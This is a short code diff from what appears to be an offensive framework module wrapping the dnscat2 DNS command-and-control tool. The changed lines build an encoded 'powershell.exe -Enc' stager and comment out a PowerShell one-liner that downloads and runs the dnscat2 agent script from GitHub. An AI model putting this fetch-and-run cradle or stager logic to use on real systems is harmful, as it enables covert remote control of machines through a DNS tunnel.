@@ -86,6 +86,7 @@ class PlatformDnsCat2Wrapper(Platform, ModuleBase):
 
             print_debug(DEBUG_MODULE, "stager = {}".format(stager))
             return helps.powershell_launcher(stager, baseCmd="powershell.exe -Enc ")  # TODO: baseCmd
+            # TODO: the encoded launcher seems not to work, the unencoded does, why???
 
         # combination platform / transport currently not supported
         else:
@@ -106,8 +107,8 @@ class PlatformDnsCat2Wrapper(Platform, ModuleBase):
         agent = f.read()
         f.close()
 
-        # or if you do not want to wait for ever for testing, TODO: remove
-        agent = "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1');"
+        # or if you do not want to wait for ever for testing
+        #agent = "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1');"
 
         zone = self.handler.transport.options['ZONE']['Value'].rstrip(".")
         server = self.handler.transport.options['DNSSERVER']['Value']
